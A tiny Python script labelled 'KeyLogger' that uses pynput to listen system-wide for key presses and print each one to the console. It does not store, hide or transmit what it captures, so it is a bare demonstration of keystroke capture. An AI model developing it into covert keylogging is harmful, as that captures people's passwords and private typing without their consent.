#KeyLogger
from pynput import keyboard
def on_press(key):
     print("Key{} pressed".format(key))
with keyboard.Listener(
     on_press=on_press
 )as Listener:
     Listener.join()  